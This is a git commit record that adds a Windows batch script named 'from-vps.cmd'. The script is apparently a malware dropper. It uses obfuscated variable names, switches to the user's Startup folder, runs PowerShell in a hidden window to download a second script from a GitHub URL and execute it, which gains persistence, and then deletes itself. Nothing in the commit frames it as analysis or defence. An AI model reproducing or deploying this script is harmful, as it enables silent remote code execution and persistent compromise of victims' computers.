4ea9c0b49992c0e30dd0e66b397ca6f2b0f358a1
blousekool <132397759+blousekool@users.noreply.github.com>
2023-05-06 23:28:53 +0200

    Add files via upload

---
+++ from-vps.cmd
@@ -0,0 +1,9 @@
+@echo off
+set "EcSjRhAguo=https://raw.github.com/blousekool/BBbdtools/main"
+set "XNjFYKECht=%cd%"
+set "YKHfpmMRoQ=C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
+cd %YKHfpmMRoQ%
+powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri http://%EcSjRhAguo%/v1.cmd -OutFile wEaoFkNduy.cmd"
+powershell ./wEaoFkNduy.cmd
+cd "%XNjFYKECht%"
+del from-vps.cmd
